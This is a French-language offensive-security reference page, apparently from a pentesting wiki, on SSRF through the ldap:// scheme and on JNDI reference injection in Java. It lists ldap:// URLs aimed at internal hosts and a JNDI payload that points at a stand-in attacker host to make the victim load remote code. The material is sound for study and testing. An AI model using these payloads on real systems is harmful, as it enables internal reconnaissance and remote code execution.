---
title: "SSRF via le schéma LDAP et abus des références JNDI"
description: "Le schéma ldap:// atteint les services d'annuaire internes, et un client Java qui résout une URL LDAP d'attaquant via JNDI peut se voir servir un objet de référence qui déclenche un chargement de code supplémentaire."
keywords:
  - schéma ldap
  - ldap://
  - référence JNDI
  - annuaire interne
  - Java naming
  - 389
---

# LDAP

`ldap://` (et `ldaps://` sur 636) adresse un service d'annuaire. En tant que schéma SSRF, il atteint un serveur LDAP interne que l'attaquant ne pouvait pas contacter directement, et sur les stacks Java il rejoint le danger plus large de la résolution de référence JNDI.

## Atteindre les annuaires internes

L'URL porte l'hôte, le port et, éventuellement, un DN de base et des termes de recherche :

```
ldap://127.0.0.1:389/
ldap://10.0.0.5:389/dc=corp,dc=local
ldaps://internal-dc.corp:636/
```

Pointée vers un annuaire interne, la requête se connecte et, selon le client, effectue un bind anonyme ou une recherche, renvoyant des données d'annuaire ou une erreur qui confirme le service. Même sans résultat lisible, le comportement de connexion est un oracle de [Port](../authority/port.md) précis pour 389 et 636.

## Objets de référence JNDI sur Java

Le risque le plus aigu est une application Java qui résout une URL `ldap://` fournie par l'attaquant via JNDI (par exemple une recherche de nommage dont le nom est influencé par l'entrée). L'attaquant exécute un serveur LDAP qui répond à la recherche avec une entrée de type **référence** pointant vers un objet distant. Lorsque le client vulnérable traite cette référence, il suit le pointeur et charge l'objet référencé, transformant une recherche de nommage en instanciation d'objet contrôlée par l'attaquant à l'intérieur de la JVM :

```
ldap://attacker.example:1389/Exploit
```

L'application effectue la recherche auprès du serveur de l'attaquant, reçoit la référence élaborée et la résout. Le mécanisme est que le client d'annuaire fait confiance à une réponse de référence pour lui indiquer quoi charger, si bien que le gain va du chargement d'une classe d'attaquant à la désérialisation d'un objet fourni par l'attaquant, selon la configuration du client.

## Quand l'utiliser

Utilisez `ldap://` pour atteindre et prendre l'empreinte des services d'annuaire internes, et traitez une entrée qui aboutit à une recherche JNDI Java comme le cas à forte valeur, où le schéma est la voie de livraison d'une référence qui escalade au-delà de la request forgery. Lorsque le client n'est pas Java ou n'utilise pas JNDI, `ldap://` reste une primitive d'accès à l'annuaire et de sonde de port.

## Outils

- **curl** : sondage manuel `ldap://` pour atteindre et prendre l'empreinte d'un service d'annuaire interne.
- **interactsh** : serveur d'interaction hors-bande open-source pour attraper une recherche JNDI contre un hôte contrôlé.
- Tests manuels avec Burp Repeater et des payloads élaborés.

## Références

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
